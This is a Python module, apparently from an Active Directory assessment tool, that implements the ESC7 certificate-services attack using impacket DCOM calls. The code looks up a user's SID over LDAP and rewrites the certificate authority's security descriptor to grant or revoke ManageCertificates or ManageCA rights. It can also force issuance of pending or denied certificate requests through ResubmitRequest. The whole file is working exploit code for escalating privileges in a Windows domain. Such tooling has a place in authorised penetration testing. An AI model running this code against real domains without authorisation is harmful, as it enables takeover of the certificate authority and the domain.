"""Native ICertAdminD/ICertAdminD2 DCOM operations for ESC7 (ManageCertificates/ManageCA)."""
from __future__ import annotations

from typing import Optional

from adscan_internal import telemetry
from adscan_internal.rich_output import print_info, print_success

# CA rights constants (matching [MS-WCCE] and certipy's constants)
CA_RIGHT_MANAGE_CA = 1
CA_RIGHT_MANAGE_CERTIFICATES = 2

# impacket DCOM types — defined at module level so NDR registry can find them
try:
    from impacket.dcerpc.v5.dcomrt import DCOMCALL, DCOMANSWER, DCERPCSessionError  # noqa: F401
    from impacket.dcerpc.v5.dtypes import DWORD, LONG, LPWSTR, PBYTE, ULONG
    from impacket.dcerpc.v5.ndr import NDRSTRUCT
    from impacket.dcerpc.v5.rpcrt import DCERPCException  # noqa: F401

    class CERTTRANSBLOB(NDRSTRUCT):
        structure = (
            ("cb", ULONG),
            ("pb", PBYTE),
        )

    # ICertAdminD opnum 4: ResubmitRequest
    class ICertAdminDResubmitRequest(DCOMCALL):
        opnum = 4
        structure = (
            ("pwszAuthority", LPWSTR),
            ("pdwRequestId", DWORD),
            ("pwszExtensionName", LPWSTR),
        )

    class ICertAdminDResubmitRequestResponse(DCOMANSWER):
        structure = (("pdwDisposition", DWORD),)

    # ICertAdminD2 opnum 36: GetCASecurity
    class ICertAdminD2GetCASecurity(DCOMCALL):
        opnum = 36
        structure = (("pwszAuthority", LPWSTR),)

    class ICertAdminD2GetCASecurityResponse(DCOMANSWER):
        structure = (("pctbSD", CERTTRANSBLOB),)

    # ICertAdminD2 opnum 37: SetCASecurity
    class ICertAdminD2SetCASecurity(DCOMCALL):
        opnum = 37
        structure = (("pwszAuthority", LPWSTR), ("pctbSD", CERTTRANSBLOB))

    class ICertAdminD2SetCASecurityResponse(DCOMANSWER):
        structure = (("ErrorCode", LONG),)

    _IMPACKET_AVAILABLE = True

except ImportError:
    _IMPACKET_AVAILABLE = False


def _dcom_connect(ca_host: str, username: str, password: str, domain: str):
    """Open a DCOMConnection to the CA host. Caller must handle disconnect."""
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.uuid import string_to_bin, uuidtup_to_bin

    _CLSID = string_to_bin("d99e6e73-fc88-11d0-b498-00a0c90312f3")
    _IID_D = uuidtup_to_bin(("d99e6e71-fc88-11d0-b498-00a0c90312f3", "0.0"))
    _IID_D2 = uuidtup_to_bin(("7fe0d935-dda6-443f-85d0-1cfb58fe41dd", "0.0"))

    dcom = DCOMConnection(ca_host, username=username, password=password, domain=domain,
                          lmhash="", nthash="", TGS=None, doKerberos=False)
    return dcom, _CLSID, _IID_D, _IID_D2, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


def _resolve_user_sid(
    dc_ip: str, domain: str, username: str, password: str, target_username: str
) -> Optional[bytes]:
    """Return the binary objectSid bytes for target_username."""
    from adscan_internal.services.ldap_transport_service import ADscanLDAPConfig, ADscanLDAPConnection
    cfg = ADscanLDAPConfig(domain=domain, dc_ip=dc_ip, use_ldaps=False,
                           use_kerberos=False, username=username, password=password)
    with ADscanLDAPConnection(cfg) as conn:
        conn.search(
            search_base=conn.domain_dn,
            search_filter=f"(sAMAccountName={target_username})",
            attributes=["objectSid"],
        )
        if not conn.entries:
            return None
        raw = conn.entries[0].entry_raw_attributes.get("objectSid") or []
        return raw[0] if raw and isinstance(raw[0], bytes) else None


def _modify_ca_right(
    *,
    ca_host: str,
    ca_name: str,
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    target_username: str,
    right: int,
    add: bool,
) -> tuple[bool, Optional[str]]:
    """Add or remove a CA right (ManageCA=1 or ManageCertificates=2) for target_username.

    Synchronous — call via ``asyncio.to_thread`` from async contexts.
    """
    if not _IMPACKET_AVAILABLE:
        return False, "impacket not available"

    try:
        from impacket.dcerpc.v5.nrpc import checkNullString
        import impacket.ldap.ldaptypes as ldaptypes

        sid_bytes = _resolve_user_sid(dc_ip, domain, username, password, target_username)
        if not sid_bytes:
            return False, f"User {target_username!r} not found in LDAP"

        user_sid = ldaptypes.LDAP_SID(data=sid_bytes)

        dcom, CLSID, IID_D, IID_D2, AUTH_LEVEL = _dcom_connect(ca_host, username, password, domain)
        iface = dcom.CoCreateInstanceEx(CLSID, IID_D2)
        iface.get_cinstance().set_auth_level(AUTH_LEVEL)

        # --- GetCASecurity ---
        get_req = ICertAdminD2GetCASecurity()
        get_req["pwszAuthority"] = checkNullString(ca_name)
        get_resp = iface.request(get_req, iid=IID_D2, uuid=iface.get_iPid())

        sd_bytes = b"".join(get_resp["pctbSD"]["pb"])
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd.fromString(sd_bytes)

        modified = False
        found_ace = False
        for i, ace in enumerate(sd["Dacl"]["Data"]):
            if ace["AceType"] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                continue
            if ace["Ace"]["Sid"].getData() != user_sid.getData():
                continue
            found_ace = True
            if add:
                if ace["Ace"]["Mask"]["Mask"] & right:
                    print_info(f"ESC7: {target_username!r} already has right={right} on {ca_name!r}")
                    return True, None
                ace["Ace"]["Mask"]["Mask"] |= right
            else:
                if not (ace["Ace"]["Mask"]["Mask"] & right):
                    return True, None  # already absent
                ace["Ace"]["Mask"]["Mask"] ^= right
                if ace["Ace"]["Mask"]["Mask"] == 0:
                    sd["Dacl"]["Data"].pop(i)
            modified = True
            break

        if not found_ace and add:
            ace = ldaptypes.ACE()
            ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            ace["AceFlags"] = 0
            ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
            ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
            ace["Ace"]["Mask"]["Mask"] = right
            ace["Ace"]["Sid"] = user_sid
            sd["Dacl"]["Data"].append(ace)
            modified = True

        if not modified:
            return True, None

        # --- SetCASecurity ---
        new_sd_bytes = [bytes([c]) for c in sd.getData()]
        set_req = ICertAdminD2SetCASecurity()
        set_req["pwszAuthority"] = checkNullString(ca_name)
        set_req["pctbSD"]["cb"] = len(new_sd_bytes)
        set_req["pctbSD"]["pb"] = new_sd_bytes
        set_resp = iface.request(set_req, iid=IID_D2, uuid=iface.get_iPid())

        if set_resp["ErrorCode"] == 0:
            action = "added" if add else "removed"
            print_success(f"ESC7: right={right} {action} for {target_username!r} on {ca_name!r}")
            return True, None
        return False, f"SetCASecurity returned ErrorCode={set_resp['ErrorCode']}"

    except Exception as exc:
        telemetry.capture_exception(exc)
        return False, str(exc)


def add_officer(
    *, ca_host: str, ca_name: str, dc_ip: str, domain: str,
    username: str, password: str, target_username: str,
) -> tuple[bool, Optional[str]]:
    """Grant ManageCertificates (officer role) to target_username on ca_name."""
    return _modify_ca_right(
        ca_host=ca_host, ca_name=ca_name, dc_ip=dc_ip, domain=domain,
        username=username, password=password, target_username=target_username,
        right=CA_RIGHT_MANAGE_CERTIFICATES, add=True,
    )


def remove_officer(
    *, ca_host: str, ca_name: str, dc_ip: str, domain: str,
    username: str, password: str, target_username: str,
) -> tuple[bool, Optional[str]]:
    """Revoke ManageCertificates (officer role) from target_username on ca_name."""
    return _modify_ca_right(
        ca_host=ca_host, ca_name=ca_name, dc_ip=dc_ip, domain=domain,
        username=username, password=password, target_username=target_username,
        right=CA_RIGHT_MANAGE_CERTIFICATES, add=False,
    )


def issue_pending_request(
    *,
    ca_host: str,
    ca_name: str,
    request_id: int,
    username: str,
    password: str,
    domain: str,
    nt_hash: Optional[str] = None,
) -> tuple[bool, Optional[str]]:
    """Issue a pending/denied certificate request via ICertAdminD.ResubmitRequest.

    Requires ManageCertificates right.  Synchronous — call via ``asyncio.to_thread``.
    """
    if not _IMPACKET_AVAILABLE:
        return False, "impacket not available — cannot call ICertAdminD"

    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.nrpc import checkNullString
        from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        from impacket.uuid import string_to_bin, uuidtup_to_bin

        CLSID_ICertAdminD = string_to_bin("d99e6e73-fc88-11d0-b498-00a0c90312f3")
        IID_ICertAdminD = uuidtup_to_bin(("d99e6e71-fc88-11d0-b498-00a0c90312f3", "0.0"))

        print_info(f"ESC7: issuing request ID {request_id} via ICertAdminD on {ca_host}...")
        dcom = DCOMConnection(
            ca_host,
            username=username,
            password=password if not nt_hash else "",
            domain=domain,
            lmhash="",
            nthash=nt_hash or "",
            TGS=None,
            doKerberos=False,
        )

        interface = dcom.CoCreateInstanceEx(CLSID_ICertAdminD, IID_ICertAdminD)
        interface.get_cinstance().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        req = ICertAdminDResubmitRequest()
        req["pwszAuthority"] = checkNullString(ca_name)
        req["pdwRequestId"] = int(request_id)
        req["pwszExtensionName"] = checkNullString("\x00")

        resp = interface.request(req, iid=IID_ICertAdminD, uuid=interface.get_iPid())
        disposition = resp["pdwDisposition"]

        # disposition 3 = CR_DISP_ISSUED (success)
        # disposition 0 = CR_DISP_INCOMPLETE (CA accepted, cert may be retrievable)
        if disposition in (3, 0):
            print_success(f"ESC7: request ID {request_id} issued (disposition={disposition}).")
            return True, None
        return False, f"ResubmitRequest returned disposition={disposition}"

    except Exception as exc:
        telemetry.capture_exception(exc)
        return False, str(exc)
